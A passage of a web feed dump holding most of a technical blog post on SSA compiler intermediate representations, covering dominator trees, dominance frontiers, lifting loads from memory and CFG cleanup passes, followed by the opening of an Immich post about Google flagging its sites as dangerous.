    &lt;p&gt;The dominance relation has some nice order properties that are necessary for defining the core graph algorithms of SSA.&lt;/p&gt;
    &lt;head rend="h3"&gt;Some Graph Theory&lt;/head&gt;
    &lt;p&gt;We only consider CFGs which are flowgraphs, that is, all blocks are reachable from the root block &lt;code&gt;@entry&lt;/code&gt;, which has no preds. This is necessary to eliminate some pathological graphs from our proofs. Importantly, we can always ask for an acyclic path11 from &lt;code&gt;@entry&lt;/code&gt; to any block &lt;code&gt;@b&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;An equivalent way to state the dominance relationship is that from every path from &lt;code&gt;@entry&lt;/code&gt; to &lt;code&gt;@b&lt;/code&gt; contains all of &lt;code&gt;@b&lt;/code&gt;âs dominators.&lt;/p&gt;
    &lt;quote&gt;&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@b&lt;/code&gt;iff every path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;contains&lt;code&gt;@a&lt;/code&gt;.&lt;p&gt;First, assume every&lt;/p&gt;&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;path contains&lt;code&gt;@a&lt;/code&gt;. If&lt;code&gt;@b&lt;/code&gt;is&lt;code&gt;@a&lt;/code&gt;, weâre done. Otherwise we need to prove each predecessor of&lt;code&gt;@b&lt;/code&gt;is dominated by&lt;code&gt;@a&lt;/code&gt;; we do this by induction on the length of acyclic paths from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;. Consider preds&lt;code&gt;@p&lt;/code&gt;of&lt;code&gt;@b&lt;/code&gt;that are not&lt;code&gt;@a&lt;/code&gt;, and consider all acyclic paths from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@p&lt;/code&gt;; by appending&lt;code&gt;@b&lt;/code&gt;to them, we have an acyclic path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;, which must contain&lt;code&gt;@a&lt;/code&gt;. Because both the last and second-to-last elements of this are not&lt;code&gt;@a&lt;/code&gt;, it must be within the shorter path which is shorter than . Thus, by induction,&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@p&lt;/code&gt;and therefore&lt;code&gt;@b&lt;/code&gt;&lt;p&gt;Going the other way, if&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@b&lt;/code&gt;, and consider a path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;. The second-to-last element of is a pred&lt;code&gt;@p&lt;/code&gt;of&lt;code&gt;@b&lt;/code&gt;; if it is&lt;code&gt;@a&lt;/code&gt;we are done. Otherwise, we can consider the path made by deleting&lt;code&gt;@b&lt;/code&gt;at the end.&lt;code&gt;@p&lt;/code&gt;is dominated by&lt;code&gt;@a&lt;/code&gt;, and is shorter than , so we can proceed by induction as above.&lt;/quote&gt;
    &lt;p&gt;Onto those nice properties. Dominance allows us to take an arbitrarily complicated CFG and extract from it a DAG, composed of blocks ordered by dominance.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The dominance relation is a partial order.&lt;/p&gt;&lt;p&gt;Dominance is reflexive and transitive by definition, so we only need to show blocks canât dominate each other.&lt;/p&gt;&lt;p&gt;Suppose distinct&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;and&lt;code&gt;@b&lt;/code&gt;dominate each other.Pick an acyclic path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@a&lt;/code&gt;. Because&lt;code&gt;@b&lt;/code&gt;dominates&lt;code&gt;@a&lt;/code&gt;, there is a prefix of this path ending in&lt;code&gt;@b&lt;/code&gt;. But because&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@b&lt;/code&gt;, some prefix of ends in&lt;code&gt;@a&lt;/code&gt;. But now must contain&lt;code&gt;@a&lt;/code&gt;twice, contradicting that it is acyclic.&lt;/quote&gt;
    &lt;p&gt;This allows us to write &lt;code&gt;@a &amp;lt; @b&lt;/code&gt; when &lt;code&gt;@a&lt;/code&gt; dominates &lt;code&gt;@b&lt;/code&gt;. There is an even more refined graph structure that we can build out of dominators, which follows immediately from the partial order theorem.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The dominators of a basic block are totally ordered by the dominance relation.&lt;/p&gt;&lt;p&gt;Suppose&lt;/p&gt;&lt;code&gt;@a1 &amp;lt; @b&lt;/code&gt;and&lt;code&gt;@a2 &amp;lt; @b&lt;/code&gt;, but neither dominates the other. Then, there must exist acyclic paths from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;which contain both, but in different orders. Take the subpaths of those paths which follow&lt;code&gt;@entry ... @a1&lt;/code&gt;, and&lt;code&gt;@a1 ... @b&lt;/code&gt;, neither of which contains&lt;code&gt;@a2&lt;/code&gt;. Concatenating these paths yields a path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;that does not contain&lt;code&gt;@a2&lt;/code&gt;, a contradiction.&lt;/quote&gt;
    &lt;p&gt;This tells us that the DAG we get from the dominance relation is actually a tree, rooted at &lt;code&gt;@entry&lt;/code&gt;. The parent of a node in this tree is called its immediate dominator.&lt;/p&gt;
    &lt;p&gt;Computing dominators can be done iteratively: the dominator set of a block &lt;code&gt;@b&lt;/code&gt; is the intersection the dominator sets of its preds, plus &lt;code&gt;@b&lt;/code&gt;. This algorithm runs in quadratic time.&lt;/p&gt;
    &lt;p&gt;A better algorithm is the Lengauer-Tarjan algorithm[^lta]. It is relatively simple, but explaining how to implement it is a bit out of scope for this article. I found a nice treatment of it here.&lt;/p&gt;
    &lt;p&gt;Whatâs important is we can compute the dominator tree without breaking the bank, and given any node, we can ask for its immediate dominator. Using immediate dominators, we can introduce the final, important property of dominators.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The dominance frontier of a block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;is the set of all blocks not dominated by&lt;code&gt;@a&lt;/code&gt;with at least one pred which&lt;code&gt;@a&lt;/code&gt;dominates.&lt;/quote&gt;
    &lt;p&gt;These are points where control flow merges from distinct paths: one containing &lt;code&gt;@a&lt;/code&gt; and one not. The dominance frontier of &lt;code&gt;@loop.body&lt;/code&gt; is &lt;code&gt;@loop.start&lt;/code&gt;, whose preds are &lt;code&gt;@entry&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;There are many ways to calculate dominance frontiers, but with a dominance tree in hand, we can do it like this:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;For each block&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;with more than one pred, for each of its preds, let&lt;code&gt;@p&lt;/code&gt;be that pred. Add&lt;code&gt;@b&lt;/code&gt;to the dominance frontier of&lt;code&gt;@p&lt;/code&gt;and all of its dominators, stopping when encountering&lt;code&gt;@b&lt;/code&gt;â immediate dominator.&lt;p&gt;We need to prove that every block examined by the algorithm winds up in the correct frontiers.&lt;/p&gt;&lt;p&gt;First, we check that every examined block&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;is added to the correct frontier. If&lt;code&gt;@a &amp;lt; @p&lt;/code&gt;, where&lt;code&gt;@p&lt;/code&gt;is a pred of&lt;code&gt;@b&lt;/code&gt;, and a&lt;code&gt;@d&lt;/code&gt;is&lt;code&gt;@b&lt;/code&gt;âs immediate dominator, then if&lt;code&gt;@a &amp;lt; @d&lt;/code&gt;,&lt;code&gt;@b&lt;/code&gt;is not in its frontier, because&lt;code&gt;@a&lt;/code&gt;must dominate&lt;code&gt;@b&lt;/code&gt;. Otherwise,&lt;code&gt;@b&lt;/code&gt;must be in&lt;code&gt;@a&lt;/code&gt;âs frontier, because&lt;code&gt;@a&lt;/code&gt;dominates a pred but it cannot dominate&lt;code&gt;@b&lt;/code&gt;, because then it would be dominated by&lt;code&gt;@i&lt;/code&gt;, a contradiction.&lt;p&gt;Second, we check that every frontier is complete. Consider a block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;. If an examined block&lt;code&gt;@b&lt;/code&gt;is in its frontier, then&lt;code&gt;@a&lt;/code&gt;must be among the dominators of some pred&lt;code&gt;@p&lt;/code&gt;, and it must be dominated by&lt;code&gt;@b&lt;/code&gt;âs immediate dominator; otherwise,&lt;code&gt;@a&lt;/code&gt;would dominate&lt;code&gt;@b&lt;/code&gt;(and thus&lt;code&gt;@b&lt;/code&gt;would not be in its frontier). Thus,&lt;code&gt;@b&lt;/code&gt;gets added to&lt;code&gt;@a&lt;/code&gt;âs dominator.&lt;/quote&gt;
    &lt;p&gt;You might notice that all of these algorithms are quadratic. This is actually a very good time complexity for a compilers-related graph algorithm. Cubic and quartic algorithms are not especially uncommon, and yes, your optimizing compilerâs time complexity is probably cubic or quartic in the size of the program!&lt;/p&gt;
    &lt;head rend="h2"&gt;Lifting Memory&lt;/head&gt;
    &lt;p&gt;Ok. Letâs construct an optimization. We want to figure out if we can replace a load from a pointer with the most recent store to that pointer. This will allow us to fully lift values out of memory by cancelling out store/load pairs.&lt;/p&gt;
    &lt;p&gt;This will make use of yet another implicit graph data structure.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The dataflow graph is the directed graph made up of the internal circuit graphs of each each basic block, connected along block arguments.&lt;/p&gt;
      &lt;p&gt;To follow a use-def chain is to walk this graph forward from an operation to discover operations that potentially depend on it, or backwards to find operations it potentially depends on.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Itâs important to remember that the dataflow graph, like the CFG, does not have a well defined âupâ direction. Navigating it and the CFG requires the dominator tree.&lt;/p&gt;
    &lt;p&gt;One other important thing to remember here is that every instruction in a basic block always executes if the block executes. In much of this analysis, we need to appeal to âprogram orderâ to select the last load in a block, but we are always able to do so. This is an important property of basic blocks that makes them essential for constructing optimizations.&lt;/p&gt;
    &lt;head rend="h3"&gt;Forward Dataflow&lt;/head&gt;
    &lt;p&gt;For a given &lt;code&gt;store %p, %v&lt;/code&gt;, we want to identify all loads that depend on it. We can follow the use-def chain of &lt;code&gt;%p&lt;/code&gt; to find which blocks contain loads that potentially depend on the store (call it &lt;code&gt;%s&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;First, we can eliminate loads within the same basic block (call it &lt;code&gt;@a&lt;/code&gt;). Replace all &lt;code&gt;load %p&lt;/code&gt; instructions after &lt;code&gt;s&lt;/code&gt; (but before any other &lt;code&gt;store %p, _&lt;/code&gt;s, in program order) with &lt;code&gt;%v&lt;/code&gt;âs def. If &lt;code&gt;s&lt;/code&gt; is not the last store in this block, weâre done.&lt;/p&gt;
    &lt;p&gt;Otherwise, follow the use-def chain of &lt;code&gt;%p&lt;/code&gt; to successors which use &lt;code&gt;%p&lt;/code&gt;, i.e., successors whose &lt;code&gt;goto&lt;/code&gt; case has &lt;code&gt;%p&lt;/code&gt; as at least one argument. Recurse into those successors, and now replacing the pointer &lt;code&gt;%p&lt;/code&gt; of interest with the parameters of the successor which were set to &lt;code&gt;%p&lt;/code&gt; (more than one argument may be &lt;code&gt;%p&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;If successor &lt;code&gt;@b&lt;/code&gt; loads from one of the registers holding &lt;code&gt;%p&lt;/code&gt;, replace all such loads before a store to &lt;code&gt;%p&lt;/code&gt;. We also now need to send &lt;code&gt;%v&lt;/code&gt; into &lt;code&gt;@b&lt;/code&gt; somehow.&lt;/p&gt;
    &lt;p&gt;This is where we run into something of a wrinkle. If &lt;code&gt;@b&lt;/code&gt; has exactly one predecessor, we need to add a new block argument to pass whichever register is holding &lt;code&gt;%v&lt;/code&gt; (which exists by induction). If &lt;code&gt;%v&lt;/code&gt; is already passed into &lt;code&gt;@b&lt;/code&gt; by another argument, we can use that one.&lt;/p&gt;
    &lt;p&gt;However, if &lt;code&gt;@b&lt;/code&gt; has multiple predecessors, we need to make sure that every path from &lt;code&gt;@a&lt;/code&gt; to &lt;code&gt;@b&lt;/code&gt; sends &lt;code&gt;%v&lt;/code&gt;, and canonicalizing those will be tricky. Worse still, if &lt;code&gt;@b&lt;/code&gt; is in &lt;code&gt;@a&lt;/code&gt;âs domination frontier, a different store could be contributing to that load! For this reason, dataflow from stores to loads is not a great strategy.&lt;/p&gt;
    &lt;p&gt;Instead, weâll look at dataflow from loads backwards to stores (in general, dataflow from uses to defs tends to be more useful), which we can use to augment the above forward dataflow analysis to remove the complex issues around domination frontiers.&lt;/p&gt;
    &lt;head rend="h3"&gt;Dependency Analysis&lt;/head&gt;
    &lt;p&gt;Letâs analyze loads instead. For each &lt;code&gt;load %p&lt;/code&gt; in &lt;code&gt;@a&lt;/code&gt;, we want to determine all stores that could potentially contribute to its value. We can find those stores as follows:&lt;/p&gt;
    &lt;p&gt;We want to be able to determine which register in a given block corresponds to the value of &lt;code&gt;%p&lt;/code&gt;, and then find its last store in that block.&lt;/p&gt;
    &lt;p&gt;To do this, weâll flood-fill the CFG backwards in BFS order. This means that weâll follow preds (through the use-def chain) recursively, visiting each pred before visiting their preds, and never revisiting a basic block (except we may need to come back to &lt;code&gt;@a&lt;/code&gt; at the end).&lt;/p&gt;
    &lt;p&gt;Determining the âequivalentâ12 of &lt;code&gt;%p&lt;/code&gt; in &lt;code&gt;@b&lt;/code&gt; (weâll call it &lt;code&gt;%p.b&lt;/code&gt;) can be done recursively: while examining &lt;code&gt;@b&lt;/code&gt;, follow the def of &lt;code&gt;%p.b&lt;/code&gt;. If &lt;code&gt;%p.b&lt;/code&gt; is a block parameter, for each pred &lt;code&gt;@c&lt;/code&gt;, set &lt;code&gt;%p.c&lt;/code&gt; to the corresponding argument in the &lt;code&gt;@b(...)&lt;/code&gt; case in &lt;code&gt;@c&lt;/code&gt;âs &lt;code&gt;goto&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Using this information, we can collect all stores that the load potentially depends on. If a predecessor &lt;code&gt;@b&lt;/code&gt; stores to &lt;code&gt;%p.b&lt;/code&gt;, we add the last such store in &lt;code&gt;@b&lt;/code&gt; (in program order) to our set of stores, and do not recurse to &lt;code&gt;@b&lt;/code&gt;âs preds (because this store overwrites all past stores). Note that we may revisit &lt;code&gt;@a&lt;/code&gt; in this process, and collect a store to &lt;code&gt;%p&lt;/code&gt; from it occurs in the block. This is necessary in the case of loops.&lt;/p&gt;
    &lt;p&gt;The result is a set &lt;code&gt;stores&lt;/code&gt; of &lt;code&gt;(store %p.s %v.s, @s)&lt;/code&gt; pairs. In the process, we also collected a set of all blocks visited, &lt;code&gt;subgraph&lt;/code&gt;, which are dominators of &lt;code&gt;@a&lt;/code&gt; which we need to plumb a &lt;code&gt;%v.b&lt;/code&gt; through. This process is called memory dependency analysis, and is a key component of many optimizations.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Not all contributing operations are stores. Some may be references to globals (which weâre disregarding), or function arguments or the results of a function call (which means we probably canât lift this load). For example&lt;/p&gt;&lt;code&gt;%p&lt;/code&gt;gets traced all the way back to a function argument, there is a code path which loads from a pointer whose stores we canât see.&lt;/quote&gt;
    &lt;p&gt;It may also trace back to a stack slot that is potentially not stored to. This means there is a code path that can potentially load uninitialized memory. Like LLVM, we can assume this is not observable behavior, so we can discount such dependencies. If all of the dependencies are uninitialized loads, we can potentially delete not just the load, but operations which depend on it (reverse dataflow analysis is the origin of so-called âtime-travelingâ UB).&lt;/p&gt;
    &lt;head rend="h3"&gt;Lifting Loads&lt;/head&gt;
    &lt;p&gt;Now that we have the full set of dependency information, we can start lifting loads. Loads can be safely lifted when all of their dependencies are stores in the current function, or dependencies we can disregard thanks to UB in the surface language (such as &lt;code&gt;null&lt;/code&gt; loads or uninitialized loads).&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;There is a lot of fuss in this algorithm about plumbing values through block arguments. A lot of IRs make a simplifying change, where every block implicitly receives the registers from its dominators as block arguments.&lt;/p&gt;
      &lt;p&gt;I am keeping the fuss because it makes it clearer whatâs going on, but in practice, most of this plumbing, except at dominance frontiers, would be happening in the background.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Suppose we can safely lift some load. Now we need to plumb the stored values down to the load. For each block &lt;code&gt;@b&lt;/code&gt; in &lt;code&gt;subgraph&lt;/code&gt; (all other blocks will now be in &lt;code&gt;subgraph&lt;/code&gt; unless stated otherwise). We will be building two mappings: one &lt;code&gt;(@s, @b) -&amp;gt; %v.s.b&lt;/code&gt;, which is the register equivalent to &lt;code&gt;%v.s&lt;/code&gt; in that block. We will also be building a map &lt;code&gt;@b -&amp;gt; %v.b&lt;/code&gt;, which is the value that &lt;code&gt;%p&lt;/code&gt; must have in that block.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;p&gt;Prepare a work queue, with each&lt;/p&gt;&lt;code&gt;@s&lt;/code&gt;in it initially.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Pop a block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;form the queue. For each successor&lt;code&gt;@b&lt;/code&gt;(in&lt;code&gt;subgraph&lt;/code&gt;):&lt;list rend="ol"&gt;&lt;item&gt;&lt;p&gt;If&lt;/p&gt;&lt;code&gt;%v.b&lt;/code&gt;isnât already defined, add it as a block argument. Have&lt;code&gt;@a&lt;/code&gt;pass&lt;code&gt;%v.a&lt;/code&gt;to that argument.&lt;/item&gt;&lt;item&gt;&lt;p&gt;If&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;hasnât been visited yet, and isnât the block containing the load weâre deleting, add it to the queue.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Once weâre done, if &lt;code&gt;@a&lt;/code&gt; is the block that contains the load, we can now replace all loads to &lt;code&gt;%p&lt;/code&gt; before any stores to &lt;code&gt;%p&lt;/code&gt; with &lt;code&gt;%v.a&lt;/code&gt;.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;There are cases where this whole process can be skipped, by applying a âpeepholeâ optimization. For example, stores followed by loads within the same basic block can be optimized away locally, leaving the heavy-weight analysis for cross-block store/load pairs.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h3"&gt;Worked Example&lt;/head&gt;
    &lt;p&gt;Hereâs the result of doing dependency analysis on our Fibonacci function. Each load is annotated with the blocks and stores in &lt;code&gt;stores&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Letâs look at &lt;code&gt;L1&lt;/code&gt;. Is contributing loads are in &lt;code&gt;@entry&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;. So we add a new parameter &lt;code&gt;%n&lt;/code&gt;: in &lt;code&gt;@entry&lt;/code&gt;, we call that parameter with &lt;code&gt;%n&lt;/code&gt; (since thatâs stored to it in &lt;code&gt;@entry&lt;/code&gt;), while in &lt;code&gt;@loop.body&lt;/code&gt;, we pass &lt;code&gt;%n.2&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;What about L4? The contributing loads are also in &lt;code&gt;@entry&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;, but one of those isnât a pred of &lt;code&gt;@exit&lt;/code&gt;. &lt;code&gt;@loop.start&lt;/code&gt; is also in the subgraph for this load, though. So, starting from &lt;code&gt;@entry&lt;/code&gt;, we add a new parameter &lt;code&gt;%a&lt;/code&gt; to &lt;code&gt;@loop.body&lt;/code&gt; and feed &lt;code&gt;0&lt;/code&gt; (the stored value, an immediate this time) through it. Now looking at &lt;code&gt;@loop.body&lt;/code&gt;, we see there is already a parameter for this load (&lt;code&gt;%a&lt;/code&gt;), so we just pass &lt;code&gt;%b&lt;/code&gt; as that argument. Now we process &lt;code&gt;@loop.start&lt;/code&gt;, which &lt;code&gt;@entry&lt;/code&gt; pushed onto the queue. &lt;code&gt;@exit&lt;/code&gt; gets a new parameter &lt;code&gt;%a&lt;/code&gt;, which is fed &lt;code&gt;@loop.start&lt;/code&gt;âs own &lt;code&gt;%a&lt;/code&gt;. We do not re-process &lt;code&gt;@loop.body&lt;/code&gt;, even though it also appears in &lt;code&gt;@loop.start&lt;/code&gt;âs gotos, because we already visited it.&lt;/p&gt;
    &lt;p&gt;After doing this for the other two loads, we get this:&lt;/p&gt;
    &lt;p&gt;After lifting, if we know that a stack slotâs pointer does not escape (i.e., none of its uses wind up going into a function call13) or a write to a global (or a pointer that escapes), we can delete every store to that pointer. If we delete every store to a stack slot, we can delete the stack slot altogether (there should be no loads left for that stack slot at this point).&lt;/p&gt;
    &lt;head rend="h3"&gt;Complications&lt;/head&gt;
    &lt;p&gt;This analysis is simple, because it assumes pointers do not alias in general. Alias analysis is necessary for more accurate dependency analysis. This is necessary, for example, for lifting loads of fields of structs through subobject pointers, and dealing with pointer arithmetic in general.&lt;/p&gt;
    &lt;p&gt;However, our dependency analysis is robust to passing different pointers as arguments to the same block from different predecessors. This is the case that is specifically handled by all of the fussing about with dominance frontiers. This robustness ultimately comes from SSAâs circuital nature.&lt;/p&gt;
    &lt;p&gt;Similarly, this analysis needs to be tweaked to deal with something like &lt;code&gt;select %cond, %a, %b&lt;/code&gt; (a ternary, essentially). &lt;code&gt;select&lt;/code&gt;s of pointers need to be replaced with &lt;code&gt;select&lt;/code&gt;s of the loaded values, which means we need to do the lifting transformation âall at onceâ: lifting some liftable loads will leave the IR in an inconsistent state, until all of them have been lifted.&lt;/p&gt;
    &lt;head rend="h2"&gt;Cleanup Passes&lt;/head&gt;
    &lt;p&gt;Many optimizations will make a mess of the CFG, so itâs useful to have simple passes that âclean upâ the mess left by transformations. Hereâs some easy examples.&lt;/p&gt;
    &lt;head rend="h3"&gt;Unused Result Elimination&lt;/head&gt;
    &lt;p&gt;If an operationâs result has zero uses, and the operation has no side-effects, it can be deleted. This allows us to then delete operations that it depended on that now have no side effects. Doing this is very simple, due to the circuital nature of SSA: collect all instructions whose outputs have zero uses, and delete them. Then, examine the defs of their operands; if those operations now have no uses, delete them, and recurse.&lt;/p&gt;
    &lt;p&gt;This bubbles up all the way to block arguments. Deleting block arguments is a bit trickier, but we can use a work queue to do it. Put all of the blocks into a work queue.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Pop a block from the queue.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Run unused result elimination on its operations.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;If it now has parameters with no uses, remove those parameters.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;For each pred, delete the corresponding arguments to this block. Then, Place those preds into the work queue (since some of their operations may have lost their last use).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;If there is still work left, go to 1.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Simplifying the CFG&lt;/head&gt;
    &lt;p&gt;There are many CFG configurations that are redundant and can be simplified to reduce the number of basic blocks.&lt;/p&gt;
    &lt;p&gt;For example, unreachable code can help delete blocks. Other optimizations may cause the &lt;code&gt;goto&lt;/code&gt; at the end of a function to be empty (because all of its successors were optimized away). We treat an empty &lt;code&gt;goto&lt;/code&gt; as being unreachable (since it has no cases!), so we can delete every operation in the block up to the last non-pure operation. If we delete every instruction in the block, we can delete the block entirely, and delete it from its predsâ &lt;code&gt;goto&lt;/code&gt;s. This is a form of dead code elimination, or DCE, which combines with the previous optimization to aggressively delete redundant code.&lt;/p&gt;
    &lt;p&gt;Some jumps are redundant. For example, if a block has exactly one pred and one successor, the predâs &lt;code&gt;goto&lt;/code&gt; case for that block can be wired directly to the successor. Similarly, if two blocks are each otherâs unique predecessor/successor, they can be fused, creating a single block by connecting the input blocksâ circuits directly, instead of through a &lt;code&gt;goto&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;If we have a ternary &lt;code&gt;select&lt;/code&gt; operation, we can do more sophisticated fusion. If a block has two successors, both of which the same unique successor, and those successors consist only of gotos, we can fuse all four blocks, replacing the CFG diamond with a &lt;code&gt;select&lt;/code&gt;. In terms of C, this is this transformation:&lt;/p&gt;
    &lt;p&gt;LLVMâs CFG simplification pass is very sophisticated and can eliminate complex forms of control flow.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;I am hoping to write more about SSA optimization passes. This is a very rich subject, and viewing optimizations in isolation is a great way to understand how a sophisticated optimization pipeline is built out of simple, dumb components.&lt;/p&gt;
    &lt;p&gt;Itâs also a practical application of graph theory that shows just how powerful it can be, and (at least in my opinion), is an intuitive setting for understanding graph theory, which can feel very abstract otherwise.&lt;/p&gt;
    &lt;p&gt;In the future, Iâd like to cover CSE/GVN, loop optimizations, and, if Iâm feeling brave, getting out of SSA into a finite-register machine (backends are not my strong suit!).&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Specifically the Swift frontend before lowering into LLVM IR. â©&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Microsoft Visual C++, a non-conforming C++ compiler sold by Microsoft â©&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;HotSpot is the JVM implementation provided by OpenJDK; C2 is the âsecond compilerâ, which has the best performance among HotSpotâs Java execution engines. â©&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;V8 is Chromiumâs JavaScript runtime. â©&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;SpiderMonkey is Firefoxâs JavaScript runtime. â©&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The Android Runtime (ART) is the âJVMâ (scare quotes) on the Android platform. â©&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The Glasgow Haskell Compiler (GHC), does not use SSA; it (like some other pure-functional languages) uses a continuation-oriented IR (compare to Schemeâs&lt;/p&gt;&lt;code&gt;call/cc&lt;/code&gt;). â©&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Every compiler person firmly believes that , because program optimization is full of NP-hard problems and we would have definitely found polynomial ideal register allocation by now if it existed. â©&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Some more recent IRs use a different version of SSA called âstructured control flowâ, or SCF. Wasm is a notable example of an SCF IR. SSA-SCF is equivalent to SSA-CFG, and polynomial time algorithms exist for losslessly converting between them (LLVM compiling Wasm, for example, converts its CFG into SCF using a ârelooping algorithmâ).&lt;/p&gt;&lt;p&gt;In SCF, operations like switch statements and loops are represented as macro operations that contain basic blocks. For example, a&lt;/p&gt;&lt;code&gt;switch&lt;/code&gt;operation might take a value as input, select a basic block to execute based on that, and return the value that basic block evaluates to as its output.&lt;p&gt;RVSDG is a notable innovation in this space, because it allows circuit analysis of entire imperative programs.&lt;/p&gt;&lt;p&gt;I am convering SSA-CFG instead of SSA-SCF simply because itâs more common, and because itâs what LLVM IR is.&lt;/p&gt;&lt;p&gt;See also this MLIR presentation for converting between the two. â©&lt;/p&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Tail calling is when a function call is the last operation in a function; this allows the caller to jump directly to the callee, recycling its own stack frame for it instead of requiring it to allocate its own. â©&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Given any path from&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;, we can make it acyclic by replacing each subpath from&lt;code&gt;@c&lt;/code&gt;to&lt;code&gt;@c&lt;/code&gt;with a single&lt;code&gt;@c&lt;/code&gt;node. â©&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;When moving from a basic block to a pred, a register in that block which is defined as a block parameter corresponds to some register (or immediate) in each predecessor. That is the âequivalentâ of&lt;/p&gt;&lt;code&gt;%p&lt;/code&gt;.&lt;p&gt;One possible option for the âequivalentâ is an immediate: for example,&lt;/p&gt;&lt;code&gt;null&lt;/code&gt;or the address of a global. In the case of a global&lt;code&gt;&amp;amp;g&lt;/code&gt;, assuming no data races, we would instead need alias information to tell if stores to this global within the current function (a) exist and (b) are liftable at all.&lt;p&gt;If the equivalent is&lt;/p&gt;&lt;code&gt;null&lt;/code&gt;, we can proceed in one of two ways depending on optimization level. If we want loads of&lt;code&gt;null&lt;/code&gt;to trap (as in Go), we need to mark this load as not being liftable, because it may trap. If we want loads of&lt;code&gt;null&lt;/code&gt;to be UB, we simply ignore that pred, because we can assume (for our analysis) that if the pointer is&lt;code&gt;null&lt;/code&gt;, it is never loaded from. â©&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Returned stack pointers do not escape: stack slotsâ lifetimes end at function exit, so we return a dangling pointer, which we assume are never loaded. So stores to that pointer before returning it can be discarded. â©&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://mcyoung.xyz/2025/10/21/ssa-1/"/><published>2025-10-22T20:13:31+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45675015</id><title>Google flags Immich sites as dangerous</title><updated>2025-10-23T06:15:46.357580+00:00</updated><content>&lt;doc fingerprint="8912a2d078360380"&gt;
  &lt;main&gt;
    &lt;p&gt;October 20, 2025&lt;/p&gt;
    &lt;p&gt;â Jason Rasmussen&lt;/p&gt;
    &lt;p&gt;Earlier this month all of our &lt;code&gt;*.immich.cloud&lt;/code&gt; websites were marked as dangerous and users started being shown the dreaded "red-screen-of-death" page.&lt;/p&gt;
    &lt;p&gt;No one on the team really understood how this browser feature worked, but it's now, unfortunately, been added to our list of Cursed Knowledge .&lt;/p&gt;
